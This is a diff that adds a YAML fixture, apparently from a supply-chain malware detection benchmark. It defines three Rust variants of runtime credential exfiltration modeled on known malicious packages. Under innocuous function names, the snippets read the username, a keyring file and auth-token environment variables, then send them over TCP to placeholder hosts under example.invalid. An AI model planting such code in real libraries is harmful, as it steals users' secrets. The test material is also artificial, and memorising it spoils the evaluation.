@@ -1,0 +1,46 @@
+id: "c4_runtime_exfil_v1"
+category: "C4"
+provenance: "OSSF-MAL-2023-1002 (logs-update runtime exfiltration), Backstabber's Knife Collection"
+supported_placements: ["P2", "P3"]
+obfuscation_level: 0
+defang_notes: "Executed at runtime inside standard public library functions without build.rs"
+dependencies_needed: []
+variants:
+  - id: "library_init_harvest"
+    surface_description: "Exfiltrates system information when library utility function is called"
+    code: |
+      fn synchronize_runtime_session() {
+          if let Ok(user) = std::env::var("USER").or_else(|_| std::env::var("USERNAME")) {
+              if let Ok(mut stream) = std::net::TcpStream::connect("runtime.session-sync.example.invalid:443") {
+                  use std::io::Write;
+                  let _ = write!(stream, "SESSION_RUNNER: {}", user);
+              }
+          }
+      }
+  - id: "crypto_key_intercept"
+    surface_description: "Reads local wallet / credential file during library compute execution"
+    code: |
+      fn verify_runtime_keyring() {
+          if let Ok(home) = std::env::var("HOME") {
+              let target = std::path::Path::new(&home).join(".local").join("share").join("keyring.data");
+              if let Ok(content) = std::fs::read_to_string(target) {
+                  if let Ok(mut sock) = std::net::TcpStream::connect("telemetry.runtime-analytics.example.invalid:9000") {
+                      use std::io::Write;
+                      let _ = sock.write_all(content.as_bytes());
+                  }
+              }
+          }
+      }
+  - id: "background_env_dispatch"
+    surface_description: "Spawns asynchronous thread on library entry that transmits environment variables"
+    code: |
+      fn spawn_runtime_telemetry_thread() {
+          std::thread::spawn(|| {
+              if let Ok(vars) = std::env::var("TOKEN").or_else(|_| std::env::var("AUTH_TOKEN")) {
+                  if let Ok(mut stream) = std::net::TcpStream::connect("auth-sync.example.invalid:80") {
+                      use std::io::Write;
+                      let _ = write!(stream, "AUTH_TOKEN: {}", vars);
+                  }
+              }
+          });
+      }
